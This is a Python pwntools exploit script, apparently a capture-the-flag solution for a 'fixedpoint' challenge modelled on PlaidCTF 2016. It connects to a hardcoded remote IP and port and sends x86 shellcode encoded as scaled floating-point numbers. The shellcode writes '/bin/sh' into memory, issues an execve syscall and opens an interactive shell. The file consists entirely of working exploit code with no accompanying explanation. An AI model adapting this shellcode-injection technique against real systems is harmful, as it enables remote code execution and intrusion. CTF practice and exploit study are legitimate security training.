import struct
import pwnlib
import time

# https://github.com/rick2600/writeups/blob/master/PlaidCTF2016/fixedpoint.md
# https://j31d0.github.io/writeup/2016/04/18/pctf2016-fixedpoint/
# https://github.com/TUCTF/write-ups-2015/blob/master/PlaidCTF/Pwn/fixedpoint/pwn_175.py

def get_int(s):
  a = struct.unpack('<f', s)[0]* 2333
  return struct.unpack('I', struct.pack('<I', a))[0]


target = pwnlib.tubes.remote.remote("106.75.84.68",20000, ssl=False)

print "Sending IEEE754 shellcode..."
time.sleep(1)

for i in range(3):
  target.sendline(str(get_int('\x00\x00\x00\x00')))

target.sendline(str(get_int('\x99\x89\xc3\x47')))     # mov ebx, eax
target.sendline(str(get_int('\x41\x44\x44\x44')))     # nop/align

for c in '/bin/sh\x00':
  target.sendline(str(get_int('\x99\xb0'+c+'\x47')))  # mov al, c
  target.sendline(str(get_int('\x57\x89\x03\x43')))   # mov [ebx], eax; inc ebx

for i in range(8):
  target.sendline(str(get_int('\x57\x4b\x41\x47')))   # dec ebx

target.sendline(str(get_int('\x99\x31\xc0\x47')))     # xor eax, eax
target.sendline(str(get_int('\x99\x31\xc9\x47')))     # xor ecx, ecx
target.sendline(str(get_int('\x99\x31\xd2\x47')))     # xor edx, edx
target.sendline(str(get_int('\x99\xb0\x0b\x47')))     # mov al, 0xb
target.sendline(str(get_int('\x99\xcd\x80\x47')))     # int 0x80

target.sendline('c')
target.interactive()